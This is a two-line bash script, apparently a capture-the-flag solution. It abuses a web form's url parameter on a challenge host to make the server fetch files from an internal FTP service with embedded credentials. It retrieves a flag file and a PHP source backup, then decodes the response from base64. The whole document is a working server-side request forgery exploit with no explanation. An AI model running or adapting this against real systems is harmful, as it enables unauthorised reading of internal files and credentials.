#!/bin/bash

curl -q 'http://nn7ed.ka0labs.org:6789/' -H 'Content-Type: application/x-www-form-urlencoded'  --data "url=ftp://rick:8===D@127.0.1.1:21/flag_1.txt" 2>/dev/null | grep ".</div>" | sed 's/<\/div>//g' | base64 -d
curl -q 'http://nn7ed.ka0labs.org:6789/' -H 'Content-Type: application/x-www-form-urlencoded'  --data "url=ftp://rick:8===D@127.0.1.1:21/muertin.php.bckp" 2>/dev/null | grep ".</div>" | sed 's/<\/div>//g' 2>/dev/null | base64 -d
